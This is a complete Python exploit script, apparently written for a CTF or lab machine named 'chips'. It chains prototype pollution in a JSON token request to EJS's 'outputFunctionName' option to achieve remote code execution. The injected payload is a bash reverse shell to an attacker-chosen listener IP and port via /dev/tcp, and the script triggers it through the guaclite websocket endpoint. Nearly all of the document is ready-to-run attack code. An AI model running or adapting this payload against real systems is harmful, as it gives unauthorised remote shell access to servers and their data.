#!/usr/bin/env python3

import requests 
import time
import traceback
import argparse

proxy = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

def ejs_rce(lhost, lport):
    token_url = "http://chips:80/token"
    headers = {"Content-Type": "application/json;charset=utf-8", "Origin": "http://chips"}
    json={"connection": {"settings": {"__proto__": {"outputFunctionName": f"x = 1; console.log(process.mainModule.require('child_process').execSync('bash -c \"exec bash -i &>/dev/tcp/{lhost}/{lport} <&1\"').toString()); y"}, "client-name": "", "console": "false", "hostname": "rdesktop", "ignore-cert": "true", "initial-program": "", "password": "abc", "port": "3389", "security": "any", "username": "abc"}, "type": "rdp"}}
    try:

        print("[*] Polluting the prototype. Sending the reverse shell payload...")
        print("[*] Payload: ", json)
        res = requests.post(token_url, headers=headers, json=json)
        data = res.json()
        token = data['token']
        if token:
            print("[+] Obtained token: ", token)
            pp_url = f"http://chips:80/rdp?token={token}"
            requests.get(pp_url)
            ppw_url = f"http://chips:80/guaclite?token={token}&width=1632&height=815"
            ppw_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Sec-WebSocket-Version": "13", "Origin": "http://chips", "Sec-WebSocket-Protocol": "guacamole", "Sec-WebSocket-Key": "wz6TpSI2hKFoFthcgKQV+A==", "Connection": "keep-alive, Upgrade", "Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade": "websocket"}
            requests.get(ppw_url, headers=ppw_headers)
            time.sleep(3)
            print("[+] Check your listener")
            print(f"[+] Listener {lhost}:{lport}")
            requests.get("http://chips/rdp?token=")
        else:
            print("[-] Error! no token obtained")
    except Exception as e:
        print("[-] Error sending the prototype pollution request: ", e)
        traceback.print_exc()
    except Exception as e:
        print("[-] CTRL + c clicked. Exiting...")


def main():
    parser = argparse.ArgumentParser(description="EJS Prototype Pollution — Remote Code Execution")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    ejs_rce(args.lhost, args.lport)

if __name__ == "__main__":
    main()
